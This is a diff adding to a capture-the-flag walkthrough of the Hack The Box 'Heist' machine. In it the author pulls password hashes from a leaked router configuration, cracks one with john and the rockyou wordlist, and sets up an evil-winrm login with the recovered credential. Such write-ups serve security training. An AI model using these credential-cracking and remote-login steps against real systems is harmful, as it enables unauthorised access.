@@ -67,7 +67,46 @@ Navigate to the webpage
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2bc80794-25ca-4678-a4fb-5ca4fb869bb6)
 
-We get this login page
+We get this login page. Since we don't have any creds lets login as guest
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58e61a19-7993-42ce-bdbf-8c6d4c00e149)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d10915da-73c3-4987-bd9a-f3993ec38178)
+
+Nice, this is a conversation between user ```Hazard``` and the ```admin```. 
+
+Lets check out the configuration file user ```Hazard``` sent.
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ce07dae4-06f7-4a39-96f6-d0f0e693bc2f)
+
+From the above screenshot we can see encrypted passwords for users ```Hazard```, ```rout3r``` and ```admin```.
+
+Lets try to crack the first password
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
+└─$ nano hash                                                        
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt            
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+stealth1agent    (?)     
+1g 0:00:01:07 DONE (2023-10-10 21:09) 0.01479g/s 51878p/s 51878c/s 51878C/s stealthy001..stcroix85
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/heist]
+└─$ cat hash
+$1$pdQG$o8nrSzsGXeaduXrjlvKc91
+```
+We got the password to be ```stealth1agent```. Lets try gain access using winrm
+
+command:```evil-winrm -u hazard -i 10.129.96.157 -p 'stealth1agent' -S```
+
 
 
 
